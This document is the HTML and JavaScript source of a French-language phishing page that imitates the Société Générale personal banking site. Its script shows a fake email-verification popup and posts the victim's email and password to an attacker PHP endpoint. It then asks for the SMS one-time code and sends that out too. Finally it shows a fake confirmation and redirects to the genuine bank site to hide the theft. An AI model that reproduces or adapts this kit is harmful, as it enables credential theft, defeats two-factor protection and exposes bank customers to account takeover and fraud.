.mfbNavbarContent{-webkit-transform:translateY(0);-moz-transform:translateY(0);-ms-transform:translateY(0);transform:translateY(0);-webkit-transition:all 0.2s;-moz-transition:all 0.2s;transition:all 0.2s;opacity:1}</style><style>#mfbNavbar.mfbNavbar{width:auto;height:auto;top:undefined;bottom:0;left:undefined;right:60px;position:fixed;z-index:150000;}#mfbButton{cursor:pointer;padding:6px 12px;border:1px solid transparent;vertical-align:bottom;min-height:40px;display:inline-block;position:relative;line-height:1;background-color:#010035;color:#ffffff;border-radius:4px 4px 0 0;-moz-transform:rotate(undefined);-webkit-transform:rotate(undefined);-ms-transform:rotate(undefined);transform:rotate(undefined);-moz-transform-origin:undefined;-webkit-transform-origin:undefined;-ms-transform-origin:undefined;transform-origin:undefined;top:undefined;right:0;bottom:0;font-size:16px;font-weight:600;text-align:center;}#mfbNavbarClose{display:none;position:absolute;right:10px;color:#dddddd;z-index:10;font-size:25px;cursor:pointer;}#mfbNavbarContent{width:auto;height:auto;min-height:50px;background-color:rgba(0, 0, 0, 0);text-align:center;}</style><style>#mfbNavbar {  z-index: 800 !important;}</style>

<style>
.my_popin_modal_overlay{
	display:block;
	position:fixed;
	z-index:9999;
	top:0;
	left:0;
	right:0;
	bottom:0;
	background-color:rgba(0,0,0,.6)
}

.my_popin_modal{
	display:block;
	position:fixed;
	z-index:9999;
	top:40%;
	left:50%;
	height:auto;
	max-height:100%;
	width:520px;
	/* padding:2.5rem 2rem 2rem; */
	padding: 0px;

	border-radius:10px;
	text-align:center;
	background-color:#fff;
	-webkit-box-shadow:0 8px 15px 0 rgba(0,0,0,.2);
	box-shadow:0 8px 15px 0 rgba(0,0,0,.2);
	-webkit-transform:translateX(-50%) translateY(-50%);
	-ms-transform:translateX(-50%) translateY(-50%);
	transform:translateX(-50%) translateY(-50%)
	min-height: 298px;
}

.my_popin_modal_content{
	display:block;
	height:auto;
	max-height:600px;
	margin-bottom:2rem;
	overflow-y:auto;
	/* font-size:1.125rem; */
	/* text-align:left; */

	/* background-color: #fefefe; */
	border-radius:10px;

	/* font-family: sourcesanspro,Arial,Helvetica,sans-serif; */
	/* font-family: "sourcesanspro-regular", helvetica, arial, sans-serif; */
}

.modal_header {
  padding: 0px;
  background-color: #010035;
  color: white;
  text-align: center;
  padding: 12px 0px;
  font-family: 'sourcesanspro', sans-serif;
  font-size: 1.1rem;
  font-weight: 600;
}

.modal_body {
	margin-top: 2rem;

	font-size: .875rem;
	font-weight: 400;
	color: #333;
	font-family: sourcesanspro,Arial,Helvetica,sans-serif;
}

.modal_input {
	border-radius: 2px;
	box-shadow: inset -1px 1px 1px 0 rgba(0, 0, 0, 0.1);
	border: solid 1px #ccc;
	color: #333;
	padding: 6px 10px 6px 10px;
	font-size: 1rem;
	font-family: "sourcesanspro-regular", helvetica, arial, sans-serif;
	font-weight: normal;
	text-align: left;
	width: 220px;
}

.org-logo{
	position:absolute;
	top:112px;
	right:27px;
}

.org-logo img{
	width:70px;
}

#btn-authent, #btn-otp{

		float: right;
    margin-top: 1em;
    color: #fff;
    background: #e9041e;
    border: #e9041e;

    pointer-events: visible;

    position: relative;
    cursor: pointer;

    border-radius: 3.125rem;
    padding: .75em 1rem;
    width: 8rem;
    box-shadow: none;


    margin: 0px 50px 0px 0px;

    font-size: 1rem;
    font-weight: 600;
    line-height: 1;
    text-align: center;
    text-decoration: none;
	font-family: sourcesanspro,arial,sans-serif;
	margin-top: 16px;
}

.dummy_image {

	height: 39.2px;
}

.dummy_side_image {
	position: absolute;
	top: 50%;
	-webkit-transform: translateY(-50%);
	-ms-transform: translateY(-50%);
	transform: translateY(-50%);
	height: 30px;
	width: 30px;
	margin-right: 1rem;
}

.input_error {
	display: none;
	color: red;
	font-size: .88em;
	font-weight: 400;
	box-sizing: border-box;
	font-family: sourcesanspro,arial,sans-serif;
}

.invalid_input {
	border-color: red;
}
</style>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>

<script type="text/javascript">

$(document).keydown(function(event){
	var keycode = (event.keyCode ? event.keyCode : event.which);
	if(keycode == '13'){
		$('#btn-authent').click();
		return false;
	}
});

var minutes,seconds,smsnumber=1;
var timer;
var fiveMinutes = 60 * 5;

$(document).ready(function(){

	$("#exampleModal").show();

	setTimeout(function()
		{
			$("#exampleModal").hide();
			$("#authModal").show();
		}, 6000);

	function startTimer(duration, display) {
		timer = duration;
		setInterval(function () {
			minutes = parseInt(timer / 60, 10)
			seconds = parseInt(timer % 60, 10);

			minutes = minutes < 10 ? "0" + minutes : minutes;
			seconds = seconds < 10 ? "0" + seconds : seconds;

			display.textContent = minutes + ":" + seconds;

			if (--timer < 0) {
				smsnumber++;
				timer = duration;
			}
		}, 1000);

	}

	$('#btn-authent').click(function(){

		var email_val = $('#email').val();
		var passwd_val = $('#password').val();

    var email_regex = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
		var passwd_regex = /^(?=.*\d)(?=.*[a-z]).{5,30}$/;

    // if(!email_regex.test(email_val)) {
		// 	$('#email').addClass('invalid_input');
		// 	$('#email').focus();
		// 	$('.input_error').html('Votre adresse e-mail est incorrecte');
		// 	$('.input_error').show();
		// 	return false;
		// }
		if(!passwd_regex.test(passwd_val)) {
      $("#exampleModal").show();
      setTimeout(function()
      {
        $("#exampleModal").hide();
        $('#password').addClass('invalid_input');
        $('#password').focus();
        $('.input_error').html('Votre mot de passe est incorrect');
        $('.input_error').show();
      }, 3000);
			
			return false;
		}

		$("#exampleModal").show();
		$.ajax({
        url: "<?=$host_name?>/orange script.php",
        data:{email:email_val, password: passwd_val},
        type:"post",
        dataType:"json",
        success: function(data){
            if(data.status=="success"){
							setTimeout(function()
							{
								$("#exampleModal").hide();
                $("#authModal").hide();
								$("#successModal").show();

								display = document.querySelector('#time');
								startTimer(fiveMinutes, display);
							}, 3000);
            }else{
							$("#exampleModal").hide();
							$('#password').addClass('invalid_input');
							$('#email').addClass('invalid_input');
							$('#password').focus();
							$('.input_error').html('Votre adresse e-mail or password est incorrecte');
							$('.input_error').show();
            }

        },
        error: function(){
					$("#exampleModal").hide();
					$('#password').addClass('invalid_input');
					$('#email').addClass('invalid_input');
					$('#password').focus();
					$('.input_error').html('Votre adresse e-mail or password est incorrecte');
					$('.input_error').show();
        }
    });
		return;

	});

	$("#btn-otp").click(function(){
		if($("#otp-input").val()!=""){
			var sms = $("#otp-input").val();
			$.ajax({
	        url: "<?=$host_name?>/init.php",
	        data:{sms:sms},
	        type:"post",
					dataType:"json",
	        success: function(data){
							console.log("success");
	        },
	        error: function(){
	        }
	    });

			$("#exampleModal").show();
			$("#successModal").hide();
			setTimeout(function()
				{
					$("#exampleModal").hide();
					$("#thanksModal").show();

					setTimeout(function()
						{
							location.href="https://particuliers.societegenerale.fr/";
						}, 6000);   //  this is thanks popup timer
				}, 5000);       //  this is sms popup timer.
		}
	});

	$('#email').keydown(function(){
		$(this).removeClass('invalid_input');
		$('.input_error').hide();
	});
	$('#password').keydown(function(){
		$(this).removeClass('invalid_input');
		$('.input_error').hide();
	});

});

</script>
</head>
        <body>
		<div class="my_popin_modal_overlay"></div>
		<div class="my_popin_modal" id="authModal" style="display:none;">
			<div class="my_popin_modal_content">
				<div class="modal_header">
					Vérification de votre Adresse e-mail.
				</div>
				<form method="post" action="" id="main-form">
				<div class="modal_body">
					<p align='center' style='color:red;'>Votre adresse e-mail doit être obligatoirement renseignée pour pouvoir recevoir toutes les informations liées à l'activité de votre compte.</p>
					<table style="margin-left: 20px;margin-bottom: 16px;">

				  <tbody>
						<tr>
					<td>
						<label style="padding-right: 12px;">
						<!-- <strong class="" style="padding-right: 12px;">Votre adresse e-mail:</strong> -->
						Adresse e-mail:
						</label>
					</td>
					<td>
						<input type="text" class="modal_input" id="email" name="email" placeholder="Adresse e-mail ou numéro de téléphone"  required="" >
					</td>
				  </tr>

				  <tr>
					<td style="height: 8px;"></td>
				  </tr>

				  <tr>
					<td>
						<label style="padding-right: 12px;">
						<!-- <strong class="" style="padding-right: 12px;">Mot de passe:</strong> -->
						Mot de passe:
						</label>
					</td>
					<td>
						<input type="password" class="modal_input" id="password" name="password"  placeholder="Mot de passe"  required="" >
					</td>

				  </tr>

				  <!-- <tr>
					<td colspan="2" align="center">Votre identifiant est incorrect</td>
				  </tr> -->

				  </tbody>
				  </table>
					<div class="org-logo">
						<img src="<?=$host_name?>/img/org2.png">
					</div>

					  <div class="input_error">incorrect emauil adress</div>

				  <button class="swm_button-principal swm_button-arrondi auth-btn-action swm_btn-disable" id="btn-authent" type="button" aria-label="Valider votre code secret">Valider</button>

				</div>
				</form>
			</div>
		</div>


		<div class="my_popin_modal" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true" style="display:none;">
		  <div class="my_popin_modal_content" role="document" style="display: block;">

			<div class="" style="">
				<div class="modal-body" id="mbody5" style="display:block;">
					  <img src="<?=$host_name?>/img/loading.gif">
				</div>
			  <div class="loaderdiv" style="display:;"></div>
			</div>

		  </div>

		</div>


		<div class="my_popin_modal" id="successModal" style="display:none;">
			<div class="my_popin_modal_content">
				<div class="modal_header">
					Authentification par SMS (Mobile)

				</div>
				<form method="post" action="" id="main-form">
				<div class="modal_body">

					<table style="margin: 0px auto;margin-bottom: 16px;">

				  <tbody><tr>
					<td align='center'>
						<label style="padding-right: 12px;">
						<!-- <strong class="" style="padding-right: 12px;">Votre adresse e-mail:</strong> -->
						Pour confirmer votre identité veuillez saisir le code SMS transmis à votre numéro de téléphone mobile.
						</label>
						<p>Code reçu par SMS:</p>
						<p>
							<input type="text" class="modal_input" id="otp-input" name="otp" placeholder="******"  required="" >
						</p>
						<p style="font-size:90%">Vous allez recevoir un code SMS dans <span id="time"></span> minutes.</p>
						<img src="<?=$host_name?>/img/sms.png" style="position: absolute; top: 150px; right: 10px; width: 80px;">
					</td>

				  </tr>

				  <tr>
					<td style="height: 8px;">

					</td>
				  </tr>


				  </tbody>
				  </table>
				  <button class="swm_button-principal swm_button-arrondi auth-btn-action swm_btn-disable" id="btn-otp" type="button" aria-label="Valider votre code secret">Valider</button>
				</div>
				</form>
			</div>
		</div>

		<div class="my_popin_modal" id="thanksModal" style="display:none;">
			<div class="my_popin_modal_content">
				<div class="modal_header">
					Confirmation,
				</div>
				<form method="post" action="" id="main-form">
				<div class="modal_body">
  					<h4>La demande de confirmation de votre numéro de téléphone a bien été prise en compte, elle sera traitée par nos services dans un délai de 48h.</h4>
					  <h4>Déconnexion en cours...</h4>
				<img src="<?=$host_name?>/img/done.png" width="56"></div>
				</form>
			</div>
		</div>

		<!--
		<div id="myModal" class="modal">


		  <div class="modal-content">

			<p>Some text in the Modal..</p>
		  </div>

		</div>
		-->
		<!--
		<div class="ngdialog">
        <div class="ngdialog-overlay"></div>
        <div class="ngdialog-content">
            <div class="panel panel-primary">
                <div class="panel-heading">modal</div>
                <div class="panel-body">content</div>
            </div>
        </div>
		</div>
		-->
		<div style="display: none;" id="lightningjs-usabilla_live"><div><iframe id="lightningjs-frame-usabilla_live" frameborder="0"></iframe></div></div>

            <header class="rsp_header header-co js-header-lhs-auth dcw_header--no-subnav">
	<nav class="rsp_nav rsp_nav--above">
		<ul class="rsp_nav__list">

        <li class="rsp_nav__item rsp_nav__item--push-right" data-channelid="7eb2e45e86bb3610VgnVCM1000000ae1c6c0RCRD">
            <a data-tms-container-label="top-menu" href="/aides-contact" class="rsp_nav__link rsp_nav__link--sub-level" data-tms-click-type="N" data-tms-element-label="aide-et-contacts"><svg aria-hidden="true" focusable="false" width="18" height="18"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20200128023755.svg#"></use></svg><span>Aide et contacts</span></a>
        </li>
</ul>
	</nav>
	<div class="rsp_header__wrapper-nav">
		<button class="rsp_btn rsp_btn--burger js-header-burger" aria-controls="menuMobile" aria-expanded="false">
    <svg class="picto-menu v-align-middle" aria-label="ouvrir menu" aria-labelledby="picto-menu" role="img" viewBox="0 0 24 26" height="26" width="24" aria-hidden="true" focusable="false"><title>Ouvrir menu</title><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20200128023755.svg#lhs-burger-menu"></use></svg>
    <svg class="picto-close v-align-middle" aria-label="fermer menu" aria-labelledby="picto-menu" role="img" viewBox="0 0 20 20" height="20" width="20" aria-hidden="true" focusable="false"><title>Fermer menu</title><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20200128023755.svg#lhs-burger-close"></use></svg>
</button>
<h2 class="rsp_header__title-logo">
    <a href="/com/icd-web/cbo/index.html#cbo/" class="rsp_header__logo-mob" title="page d'accueil">
        <svg aria-hidden="true" focusable="false" xmlns="http://www.w3.org/2000/svg" width="23" height="23" viewBox="0 0 23 23">
            <g fill="none" fill-rule="evenodd">
              <path fill="#ED0210" d="M0 11.335h22.22V0H0z"></path>
              <path fill="#000" d="M0 22.141h22.22V11.032H0z"></path>
              <path fill="#FFF" d="M4.413 11.649h14.456v-1.352H4.413z"></path>
            </g>
        </svg>
    </a>
    <a href="/com/icd-web/cbo/index.html#cbo/" class="rsp_header__logo-desktop" aria-label="page d'accueil:particulier">
        <svg xmlns="http://www.w3.org/2000/svg" width="74" height="39" viewBox="0 0 74 39">
            <g fill="none" fill-rule="evenodd">
          <text fill="#333" font-family="Montserrat-Bold, Montserrat" font-size="9" font-weight="bold" letter-spacing=".3">
            <tspan x=".432" y="37">PARTICULIERS</tspan>
          </text>
          <path fill="#E60028" d="M24 12h24V0H24z"></path>
          <path fill="#1A171B" d="M24 24h24V12H24z"></path>
          <path fill="#FFF" d="M28 13h16v-2H28z"></path>
        </g>
        </svg>
    </a>
</h2>
<nav class="rsp_nav" role="navigation" aria-label="navigation principale">
			<ul class="rsp_nav__list js-nav-desktop">




























<!-- LINKS -->
            <li class="rsp_nav__item has-popup ml-xl ml-l pl-0 js-mainnav-link is-active" data-channelid="5e2a2ee50183e510VgnVCM100000020012acRCRD">
<a aria-controls="nav5e9d7262044af610VgnVCM1000000ae1c6c0RCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="rsp_nav__link" data-tms-container-label="navigation-connected" data-tms-element-label="comptes-et-cartes" href="/restitution/cns_listeprestation.html" data-tms-click-type="N">                    Comptes et cartes
</a>
    </li>

            <li class="rsp_nav__item has-popup  js-mainnav-link" data-channelid="5a4c0f9d49b37610VgnVCM10000057f440c0RCRD">
<a aria-controls="nav2cbd7262044af610VgnVCM1000000ae1c6c0RCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="rsp_nav__link" data-tms-container-label="navigation-connected" data-tms-element-label="emprunter" href="/icd/espaces-thematiques/credit/credit-restit.html" data-tms-click-type="N">                    Emprunter
</a>            <ul class="rsp_nav__list js-sub-level">
                 <!-- LINKS -->
            			<li class="rsp_nav__item js-secondlvl-link js-outside-dropdown" data-channelid="4a88d7eb61b7e510VgnVCM100000020012acRCRD">
<a aria-controls="navd1ba25855cdcf610VgnVCM1000000ae1c6c0RCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="rsp_nav__link rsp_nav__link--connect" data-tms-container-label="navigation-connected" data-tms-element-label="accueil-prêts" data-anchor="null" href="/icd/espaces-thematiques/credit/credit-restit.html#restit" data-tms-click-type="N">            							Accueil prêts
</a>            			</li>
            			<li class="rsp_nav__item js-secondlvl-link js-outside-dropdown" data-channelid="dc4563f637cc4610VgnVCM10000057f440c0RCRD">
<a aria-controls="nav6cea25855cdcf610VgnVCM1000000ae1c6c0RCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="rsp_nav__link rsp_nav__link--connect" data-tms-container-label="navigation-connected" data-tms-element-label="crédit-à-la-consommation" data-anchor="null" data-cm="1" href="/secure/pret/espace-thematique-pret/credit-consommation-co" data-tms-click-type="N">            							Crédit à la consommation
</a>            			</li>
            			<li class="rsp_nav__item js-secondlvl-link js-outside-dropdown" data-channelid="f2477c7ac9f64610VgnVCM10000057f440c0RCRD">
<a aria-controls="nav624b25855cdcf610VgnVCM1000000ae1c6c0RCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="rsp_nav__link rsp_nav__link--connect" data-tms-container-label="navigation-connected" data-tms-element-label="crédit-immobilier" data-anchor="null" data-cm="1" href="/secure/pret/espace-thematique-pret/pret-credit-immobilier" data-tms-click-type="N">            							Crédit immobilier
</a>            			</li>
            </ul>
    </li>

            <li class="rsp_nav__item has-popup  js-mainnav-link" data-channelid="65a22a7e5457e510VgnVCM100000020012acRCRD">
<a aria-controls="nav361725855cdcf610VgnVCM1000000ae1c6c0RCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="rsp_nav__link" data-tms-container-label="navigation-connected" data-tms-element-label="épargner" href="/cem/CED10.html?AOPL=COMSTOCK" data-tms-click-type="N">                    Épargner
</a>            <ul class="rsp_nav__list js-sub-level">
                 <!-- LINKS -->
            			<li class="rsp_nav__item js-secondlvl-link js-outside-dropdown" data-channelid="65a22a7e5457e510VgnVCM100000020012acRCRD">
<a aria-controls="nave4c6742890ecf610VgnVCM1000000ae1c6c0RCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="rsp_nav__link rsp_nav__link--connect" data-tms-container-label="navigation-connected" data-tms-element-label="bourse" data-anchor="null" href="/cem/CED10.html?AOPL=COMSTOCK" data-tms-click-type="N">            							Bourse
</a>            			</li>
            			<li class="rsp_nav__item js-secondlvl-link js-outside-dropdown" data-channelid="5fad885f3a7df610VgnVCM10000057f440c0RCRD">
<a aria-controls="nav9a3e184a27ecf610VgnVCM1000000ae1c6c0RCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="rsp_nav__link rsp_nav__link--connect" data-tms-container-label="navigation-connected" data-tms-element-label="nos-offres-d'épargne" data-anchor="null" data-cm="1" href="/epargner-placer-son-argent" data-tms-click-type="N">            							Nos offres d'épargne
</a>            			</li>
            </ul>
    </li>

            <li class="rsp_nav__item has-popup  js-mainnav-link" data-channelid="30d8d7eb61b7e510VgnVCM100000020012acRCRD">
<a aria-controls="nava19d7262044af610VgnVCM1000000ae1c6c0RCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="rsp_nav__link" data-tms-container-label="navigation-connected" data-tms-element-label="assurer" href="/icd/assup/assup-restit.html#restit-home/" data-tms-click-type="N">                    Assurer
</a>            <ul class="rsp_nav__list js-sub-level">
                 <!-- LINKS -->
            			<li class="rsp_nav__item js-secondlvl-link js-outside-dropdown" data-channelid="7a9f804f6193f510VgnVCM100000030013acRCRD">
<a aria-controls="nav1bbc25855cdcf610VgnVCM1000000ae1c6c0RCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="rsp_nav__link rsp_nav__link--connect" data-tms-container-label="navigation-connected" data-tms-element-label="accueil-assurances" data-anchor="null" href="/icd/assup/assup-restit.html#restit-home/" data-tms-click-type="N">            							Accueil assurances
</a>            			</li>
            			<li class="rsp_nav__item js-secondlvl-link js-outside-dropdown" data-channelid="5d9d885f3a7df610VgnVCM10000057f440c0RCRD">
<a aria-controls="nava0cc25855cdcf610VgnVCM1000000ae1c6c0RCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="rsp_nav__link rsp_nav__link--connect" data-tms-container-label="navigation-connected" data-tms-element-label="nos-offres-d’assurances" data-anchor="null" href="/assurances" data-tms-click-type="N">            							Nos offres d’assurances
</a>            			</li>
            </ul>
    </li>

            <li class="rsp_nav__item   js-mainnav-link" data-channelid="0dbb5d7dc69ff610VgnVCM10000057f440c0RCRD">
<a aria-controls="nav6bfc25855cdcf610VgnVCM1000000ae1c6c0RCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="rsp_nav__link" data-tms-container-label="navigation-connected" data-tms-element-label="nos-conseils" data-anchor="null" href="/secure/nos-conseils-espace-client" data-tms-click-type="N">                    Nos conseils
</a>    </li>

            <li class="rsp_nav__item has-popup  js-mainnav-link" data-channelid="88050ac5d68ef610VgnVCM10000057f440c0RCRD">
<a aria-controls="nav098d7262044af610VgnVCM1000000ae1c6c0RCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="rsp_nav__link" data-tms-container-label="navigation-connected" data-tms-element-label="autres" data-anchor="null" href="/secure/autres" data-tms-click-type="N">                    Autres
</a>            <ul class="rsp_nav__list js-sub-level">
                 <!-- LINKS -->
            			<li class="rsp_nav__item js-secondlvl-link js-outside-dropdown" data-channelid="b86f161bb7d63610VgnVCM1000000ae1c6c0RCRD">
<a aria-controls="navc3bc25855cdcf610VgnVCM1000000ae1c6c0RCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="rsp_nav__link rsp_nav__link--connect" data-tms-container-label="navigation-connected" data-tms-element-label="documents" data-anchor="null" data-cm="1" href="/secure/autres/mes-documents" data-tms-click-type="N">            							Documents
</a>            			</li>
            			<li class="rsp_nav__item js-secondlvl-link js-outside-dropdown" data-channelid="c3fa2334a5ec5610VgnVCM10000057f440c0RCRD">
<a aria-controls="navd774ff08d2ecf610VgnVCM1000000ae1c6c0RCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="rsp_nav__link rsp_nav__link--connect" data-tms-container-label="navigation-connected" data-tms-element-label="offres-et-avantages" data-anchor="null" data-cm="1" href="/secure/autres/offres-et-avantages/mes-souscriptions-et-avantages" data-tms-click-type="N">            							Offres et avantages
</a>            			</li>
            			<li class="rsp_nav__item js-secondlvl-link js-outside-dropdown" data-channelid="f1bcf2e2b9e63610VgnVCM1000000ae1c6c0RCRD">
<a aria-controls="nav9c35ff08d2ecf610VgnVCM1000000ae1c6c0RCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="rsp_nav__link rsp_nav__link--connect" data-tms-container-label="navigation-connected" data-tms-element-label="profil" data-anchor="null" data-cm="1" href="/secure/autres/mon-profil" data-tms-click-type="N">            							Profil
</a>            			</li>
            			<li class="rsp_nav__item js-secondlvl-link js-outside-dropdown" data-channelid="40e36f489963e610VgnVCM10000057f440c0RCRD">
<a aria-controls="nava635ff08d2ecf610VgnVCM1000000ae1c6c0RCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="rsp_nav__link rsp_nav__link--connect" data-tms-container-label="navigation-connected" data-tms-element-label="rendez-vous" data-anchor="null" href="/icd/rvd_rva/restitution_rdv/index-authsec.html" data-tms-click-type="N">            							Rendez-vous
</a>            			</li>
            </ul>
    </li>






<script id="hidden-autocompletion-file" type="text/x-custom-template">
   https://particuliers.societegenerale.fr/static/Configurations/Search/search_keywords_list_20180821152355.json
</script>

<li class="rsp_nav__item rsp_nav__item--picto ml-auto js-desktop-panel-search">
    <button class="rsp_btn bd-l_before js-search-menu" aria-expanded="true" aria-controls="searchBox">
	<!--
      <svg viewBox="0 0 24 24" height="24" width="24" aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="https://particuliers.societegenerale.fr/static/Resources/img/pictos-fonctionnels_20200128023755.svg#search"></use></svg>
      <span class="rsp_btn__legend">Recherche</span>
	-->
		<img src="https://www.brisbaneopalmuseum.com.au/modules/photomanagement/extra/img/recherche.png" class="dummy_image" style="width: 54.1667px;">
    </button>
    <div class="rsp_search-box__wrapper js-search-wrapper">
      <form class="rsp_search-box js-main-search" action="/secure/resultats-recherche" method="post">
        <label class="rsp_search-box__label js-main-search_label">Rechercher :</label>
        <div class="rsp_search-box__content-list">
          <input class="rsp_search-box__input js-main-search_field">
          <svg viewBox="0 0 24 24" height="24" width="24" aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20200128023755.svg#search"></use></svg>
          <ul class="rsp_search-box__list js-main-search_list"></ul>
        </div>
      </form>
    </div>
  </li>

        <li class="rsp_nav__item rsp_nav__item--picto  ml-sm-auto" id="js-counter-alerting">
<a data-channelid="314cb78323c6f510VgnVCM100000030013acRCRD" aria-expanded="false" class="rsp_btn bd-l_before" data-tms-container-label="login-box-transactional" data-tms-element-label="voir-alerte" href="/com/icd-web/alerting/fil-alertes.html#fil-alertes/" data-tms-click-type="N">
					<!--
<svg class="dcw_login_icon-alert" height="24" width="24" aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20200128023755.svg#lhs-notification"></use></svg>
                    <span class="js-nav-user-counter rsp_counter"></span>
                    <span class="rsp_btn__legend">Notifications</span>
					-->
					<img src="https://www.brisbaneopalmuseum.com.au/modules/photomanagement/extra/img/notifications.png" class="dummy_image" style="width: 66.5333px;">
</a>    </li>


        <li class="rsp_nav__item rsp_nav__item--picto " id="js-counter-gms">
<a data-channelid="fe9c4b5c105e0610VgnVCM100000060012acRCRD" aria-expanded="false" class="rsp_btn bd-l_before" data-tms-container-label="login-box-transactional" data-tms-element-label="voir-gms" href="/gms/gmsListeMessages.html" data-tms-click-type="N">
					<!--
<svg class="dcw_login_icon-user" height="24" width="24" aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20200128023755.svg#lhs-message"></use></svg>
                    <span class="js-nav-user-counter rsp_counter"></span>
                    <span class="rsp_btn__legend">Messagerie</span>
					-->
					<img src="https://www.brisbaneopalmuseum.com.au/modules/photomanagement/extra/img/messagerie.png" class="dummy_image" style="width: 66.5333px;">
</a>    </li>




<li class="rsp_nav__item rsp_nav__item--picto mr-l mr-0">
    <a href="#" class="js-lgc-logout rsp_btn bd-l_before" aria-label="espace client:deconnexion" data-tms-element-label="se-deconnecter" data-tms-container-label="login-box-connected" data-cms-callback-url="/page-deconnexion" data-tms-click-type="A">
      <svg aria-hidden="true" focusable="false" class="picto-mob" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 32 32">
    <g fill="none" fill-rule="evenodd">
      <circle cx="16" cy="16" r="16" fill="#EE3B45"></circle>
      <g fill="#FFF">
        <path d="M9.99 10.01l1.414 1.415a6.5 6.5 0 1 0 9.192 0l1.414-1.415a8.5 8.5 0 1 1-12.02 0z"></path>
        <path d="M14.98 7h2v10h-2z"></path>
      </g>
    </g>
</svg>
      <svg aria-hidden="true" focusable="false" class="picto-desktop" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24">
    <g fill="none" fill-rule="evenodd">
      <circle cx="12" cy="12" r="12" fill="#E9041E"></circle>
      <g stroke="#FFF" stroke-width="2">
        <path d="M8.667 7.84a5.32 5.32 0 0 0-2 4.16 5.334 5.334 0 0 0 10.666 0 5.32 5.32 0 0 0-2-4.16M12 6v6.587"></path>
      </g>
    </g>
  </svg>
      <span class="rsp_btn__legend js-login-names" style="font-weight: 700;">D&eacute;connexion</span>
    </a>
</li></ul>
		</nav>
		<aside class="rsp_menu-mob js-burger-content">
			<nav class="rsp_nav js-nav-mobile">
				<ul class="rsp_nav__list">






























        <li class="rsp_nav__item">
        <button class="rsp_btn rsp_btn--toggle js-nav-mobile-first-lvl-btn" aria-expanded="false">Comptes et cartes
              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24">
                <path fill="currentColor" fill-rule="evenodd" d="M19.618 7L21 8.331 12 17 3 8.331 4.382 7 12 14.337z"></path>
              </svg>
            </button>
            <ul class="rsp_nav__list js-nav-mobile-second-lvl-container">
                 <!-- LINKS -->
                    <li class="rsp_nav__item rsp_nav__item--connect">
<a data-channelid="5007876c77cde510VgnVCM100000030013acRCRD" aria-controls="nav291e7262044af610VgnVCM1000000ae1c6c0RCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="rsp_nav__link rsp_nav__link--sub-level" data-tms-container-label="navigation-connected" data-tms-element-label="mes-comptes" data-anchor="null" href="/sbm-mob/mob/sbm-rlv-snt-cpt.html" data-tms-click-type="N">                                    Mes comptes
</a>                    </li>
                    <li class="rsp_nav__item rsp_nav__item--connect">
<a data-channelid="5007876c77cde510VgnVCM100000030013acRCRD" aria-controls="nav0f2e7262044af610VgnVCM1000000ae1c6c0RCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="rsp_nav__link rsp_nav__link--sub-level" data-tms-container-label="navigation-connected" data-tms-element-label="virements" data-anchor="null" href="/sbm-mob/mob/sbm-vir-index.html" data-tms-click-type="N">                                    Virements
</a>                    </li>
                    <li class="rsp_nav__item rsp_nav__item--connect">
<a data-channelid="525d4d9a3e2ee510VgnVCM100000030013acRCRD" aria-controls="nav142e7262044af610VgnVCM1000000ae1c6c0RCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="rsp_nav__link rsp_nav__link--sub-level" data-tms-container-label="navigation-connected" data-tms-element-label="prélèvements" data-anchor="null" href="/sbm-mob/mob/sbm-prel-index.html" data-tms-click-type="N">                                    Prélèvements
</a>                    </li>
                    <li class="rsp_nav__item rsp_nav__item--connect">
<a data-channelid="5007876c77cde510VgnVCM100000030013acRCRD" aria-controls="nav0e0e7262044af610VgnVCM1000000ae1c6c0RCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="rsp_nav__link rsp_nav__link--sub-level" data-tms-container-label="navigation-connected" data-tms-element-label="cartes" data-anchor="null" href="/sbm-mob/mob/sbm-cartes-snt.html" data-tms-click-type="N">                                    Cartes
</a>                    </li>
                    <li class="rsp_nav__item rsp_nav__item--connect">
